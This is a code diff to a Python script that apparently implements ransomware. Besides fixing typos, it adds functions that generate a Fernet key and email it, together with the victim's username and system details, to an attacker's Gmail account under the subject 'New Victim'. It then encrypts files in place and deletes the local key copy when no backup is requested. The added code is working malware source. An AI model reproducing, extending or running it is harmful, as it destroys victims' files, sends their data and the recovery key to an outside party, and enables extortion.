@@ -28,8 +28,8 @@ def get_target_location(d_name):
     os.chdir(f_location)
     return f_location
 
-#directory enumration
-def enum_directuriy_files(directory):   
+#directory enumeration
+def enum_directory_files(directory):   
 
     list_files = []
 
@@ -44,17 +44,66 @@ def enum_directuriy_files(directory):
 #leave the .*
 def trim_list_files(list):
 
-    trimed_list =  []
+    trimmed_list =  []
     for var in list:
         var = re.sub(r'^.*?\.', '.', var)
-        trimed_list.append(var)
+        trimmed_list.append(var)
     
-    return(trimed_list)
+    return(trimmed_list)
 
 
-def test_success():
-    print (enum_directuriy_files('Desktop'))
+
+def send_email():
+    load_dotenv() 
+    email_address = os.environ.get("gmail_account")
+    password = os.environ.get("gmail_password")
+    msg = MIMEMultipart()
+    msg['Subject'] = f'New Victim - { getpass.getuser() }'
+    msg['From'] = email_address
+    msg['to'] = email_address
+    crypto_key = f'{pathlib.Path(__file__).parent.absolute()}/cryptographic_key.key'
+    msg_body = ( 
+        f'Username: {getpass.getuser()} \n'
+        f'\n'
+        f'System: {platform.uname().system} \n'
+        f'None: {platform.uname().node} \n'
+        f'Release: {platform.uname().release} \n'
+        f'Version: {platform.uname().version} \n'
+        f'Machine: {platform.uname().machine} \n'
+        f'Processor: {platform.uname().processor} \n'
+        f'\n'
+        f'Cryptographic Key: { open(crypto_key).read() } \n'
+        )
+    msg.attach(MIMEText(msg_body,'plain'))
+    try:
+        smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+        smtp_server.ehlo()
+        smtp_server.login(email_address, password)
+        smtp_server.sendmail(email_address, email_address, msg.as_string())
+        smtp_server.close()
+    except Exception as error_msg:
+        print ("Error:",error_msg)
 
 
-test_success()
-trim_list_files(enum_directuriy_files('Desktop'))
+
+def generate_key():
+    key = Fernet.generate_key()
+    with open('cryptographic_key.key', 'wb') as key_file:
+        key_file.write(key)
+    send_email()
+
+def encrypt_files(file_list):
+    with open(f'{pathlib.Path(__file__).parent.absolute()}/cryptographic_key.key', 'rb') as key_file:
+        cryptographic_key = key_file.read()
+    fernet = Fernet(cryptographic_key)
+    if file_list:
+        for document in file_list:
+            with open(document, 'rb') as file:
+                document_original = file.read()
+            document_criptat = fernet.encrypt(document_original)
+            with open(document, 'wb') as encrypted_document:
+                encrypted_document.write(document_criptat)
+        if args.backup == False:        
+            os.remove(f'{pathlib.Path(__file__).parent.absolute()}/cryptographic_key.key') 
+    else:
+        print('No document in directory')
